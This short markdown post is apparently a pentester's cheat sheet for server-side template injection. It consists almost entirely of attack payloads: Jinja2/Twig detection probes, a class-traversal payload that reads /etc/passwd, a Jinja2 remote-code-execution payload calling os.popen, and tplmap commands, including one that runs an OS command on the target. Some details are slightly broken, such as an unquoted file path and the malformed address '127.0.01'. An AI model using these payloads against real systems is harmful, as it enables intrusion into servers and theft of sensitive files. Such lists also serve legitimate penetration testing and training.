---
layout: post
title: "ssti"
keywords: "server side template injection"
---

#### Identification
[Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology)
```
${7*7} != {{7*7}} = {{7*'7'}} = Jinja2/Twig
```

#### Read File (LFI)
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/passwd).read()}} 
```

#### Remote Code Execution (RCE)
```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

#### TPLMap
```
./tplmap.py -u http://127.0.01/ -d 'name'
./tplmap.py -u http://127.0.01/ -d 'name' --os-cmd 'cat /etc/passwd'
```